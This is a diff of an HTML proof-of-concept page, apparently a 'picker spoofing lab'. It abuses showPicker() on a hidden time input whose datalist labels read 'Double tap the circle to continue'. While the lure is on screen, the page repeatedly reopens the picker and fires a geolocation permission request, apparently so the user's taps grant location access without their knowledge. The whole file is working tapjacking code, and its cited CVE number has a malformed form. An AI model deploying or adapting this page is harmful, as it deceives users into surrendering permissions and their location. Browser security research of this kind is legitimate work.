@@ -3,14 +3,14 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Advanced Heavy-Duty Picker Spoofing Lab (CVE-40067274 Context)</title>
+    <title>Advanced Picker Spoofing Lab (CVE-40067274 Context)</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             margin: 0;
             padding: 40px;
-            background-color: #0d1117;
-            color: #c9d1d9;
+            background-color: #121212;
+            color: #e0e0e0;
             text-align: center;
             display: flex;
             flex-direction: column;
@@ -18,117 +18,102 @@
             justify-content: center;
             height: 100vh;
             cursor: pointer;
-            overflow: hidden;
         }
         h1 {
-            color: #f85149;
-            font-size: 22px;
+            color: #ff5252;
+            font-size: 24px;
             margin-bottom: 10px;
         }
         .info-box {
-            background: #161b22;
-            border: 1px solid #30363d;
+            background: #1e1e1e;
+            border: 1px solid #333;
             padding: 15px;
             border-radius: 6px;
-            max-width: 550px;
-            width: 100%;
-            font-size: 12px;
-            color: #8b949e;
+            max-width: 500px;
+            font-size: 13px;
+            color: #b0b0b0;
             margin-top: 20px;
             text-align: left;
-            max-height: 200px;
-            overflow-y: auto;
-            font-family: monospace;
         }
-        code { background: #21262d; color: #ff7b72; padding: 2px 5px; border-radius: 3px; }
-        /* Simulasi elemen overlay penutup layar untuk uji lab */
-        #overlay-layer {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.05);
-            z-index: 9999;
-            display: none;
-            pointer-events: none;
-        }
+        code { background: #2d2d2d; color: #ff8a80; padding: 2px 4px; border-radius: 3px; font-family: monospace; }
     </style>
 </head>
 <body>
 
-    <div id="overlay-layer"></div>
+    <h1>⚠️ Tap the screen to initialize lab test</h1>
+    <p style="font-size: 14px; color: #888;">Menguji siklus pemanggilan <code>showPicker()</code> dan interaksi izin asinkron.</p>
 
-    <h1>⚠️ Heavy-Duty Picker Spoofing Lab</h1>
-    <p style="font-size: 13px; color: #8b949e;">Klik layar untuk menguji ketahanan token aktivasi dan batasan pemanggilan <code>showPicker()</code> berulang.</p>
-
-    <!-- Elemen Input & Datalist Dinamis -->
-    <input id="target-input" type="time" list="times" style="display:none;" />
+    <!-- Elemen Input & Datalist Target -->
+    <input id="input" type="time" list="times" style="display:none;" />
     <datalist id="times">
-        <select id="target-select">
-            <option label="[!] Security Context Validation">00:00</option>
-            <option label="⬇️ Overlay Alignment Test">00:00</option>
-            <option label="⬇️ Tapjacking Simulation">00:00</option>
-            <option label="⭕ Target Zone">00:00</option>
+        <select>
+            <option label="Double tap the circle to continue">00:00</option>
+            <option label="⬇️       ">00:00</option>
+            <option label="⬇️       ">00:00</option>
+            <option label="⬇️       ">00:00</option>
+            <option label="⬇️       ">00:00</option>
+            <option label="⭕      ">00:00</option>
+            <option label="">00:00</option>
         </select>
     </datalist>
 
     <div class="info-box" id="log-box">
-        [System] Lab siap. Menunggu gestur klik pengguna...
+        <strong>Status Log:</strong> Menunggu interaksi klik/sentuh pengguna...
     </div>
 
 <script>
     const logBox = document.getElementById('log-box');
-    const overlay = document.getElementById('overlay-layer');
 
-    function appendLog(msg, isError = false) {
-        const timeStr = new Date().toISOString().split('T')[1].slice(0, 12);
-        console.log(`[${timeStr}] ${msg}`);
-        logBox.innerHTML += `<br><span style="color: ${isError ? '#f85149' : '#52bef8'}">[${timeStr}]</span> ${msg}`;
-        logBox.scrollTop = logBox.scrollHeight;
+    function appendLog(msg) {
+        console.log(msg);
+        logBox.innerHTML += `<br>[${new Date().toLocaleTimeString()}] ${msg}`;
     }
 
-    function triggerPickerAttempt(index) {
+    function showList() {
         try {
-            const inputEl = document.getElementById('target-input');
-            
-            // Penguatan: Memaksa pemanggilan metode showPicker secara langsung
-            inputEl.showPicker();
-            appendLog(`Sukses: showPicker() tereksekusi pada iterasi ke-${index}`);
-        } catch (err) {
-            appendLog(`Ditolak/Diblokir (Iterasi ${index}): ${err.name} - ${err.message}`, true);
+            // Memeriksa status izin geolokasi sebelum memicu picker
+            navigator.permissions.query({ name: 'geolocation' }).then(permissionStatus => {
+                if (permissionStatus.state === 'granted') {
+                    appendLog("Izin geolokasi sudah diberikan. Menghentikan simulasi picker.");
+                    return;
+                }
+
+                // Penguatan: Mencoba memanggil showPicker() dengan penanganan eksepsi aktif
+                input.showPicker();
+                appendLog("Berhasil memicu input.showPicker()");
+            }).catch(err => {
+                appendLog("Error pada permissions query: " + err.message);
+            });
+        } catch (e) {
+            appendLog("[DITOLAK/BLOCKED] showPicker() gagal: " + e.message);
         }
     }
 
     document.body.onclick = async () => {
-        appendLog("Gestur klik terdeteksi (User Activation Sah). Memulai rangkaian uji...");
+        appendLog("Interaksi pengguna terdeteksi (User Activation sah).");
         
-        // Mengaktifkan elemen overlay simulasi visual lab
-        overlay.style.display = 'block';
+        // Eksekusi awal
+        showList();
 
-        // Percobaan 1: Eksekusi instan di dalam siklus microtask / stack awal
-        triggerPickerAttempt(1);
-
-        // Percobaan 2: Pemanfaatan interval berkecepatan tinggi untuk menguji pembatasan ConsumeIfActive
-        let counter = 2;
-        const stressInterval = setInterval(() => {
-            triggerPickerAttempt(counter);
-            counter++;
-
-            // Batasi hingga 8 kali percobaan agresif dalam rentang waktu singkat
-            if (counter > 8) {
-                clearInterval(stressInterval);
-                appendLog("Uji stres interval selesai. Perhatikan penolakan NotAllowedError di atas.");
-                overlay.style.display = 'none';
+        // Penguatan Interval Berulang untuk menguji batas konsumsi user activation (ConsumeIfActive)
+        let attempt = 1;
+        const intervalId = setInterval(() => {
+            appendLog(`Mencoba pemanggilan berulang ke-${attempt}`);
+            showList();
+            attempt++;
+            
+            // Batasi hingga 5 kali percobaan interval untuk analisis lab
+            if (attempt > 5) {
+                clearInterval(intervalId);
+                appendLog("Pengujian interval selesai. Perhatikan respons konsumsi token aktivasi.");
             }
-        }, 100);
+        }, 300);
 
-        // Memicu dialog izin sistem secara asinkron paralel
-        try {
-            navigator.geolocation.getCurrentPosition(
-                (pos) => { appendLog("Callback Geolokasi: Diizinkan (" + pos.coords.latitude + ")"); },
-                (err) => { appendLog("Callback Geolokasi: Ditolak/Error (" + err.message + ")", true); }
-            );
-        } catch (e) {
-            appendLog("Error pada pemanggilan geolocation: " + e.message, true);
-        }
+        // Memicu permintaan geolokasi asinkron secara paralel
+        navigator.geolocation.getCurrentPosition(
+            (pos) => { appendLog("Geolokasi diizinkan: " + pos.coords.latitude); },
+            (err) => { appendLog("Geolokasi ditolak/error: " + err.message); }
+        );
     };
 </script>
 
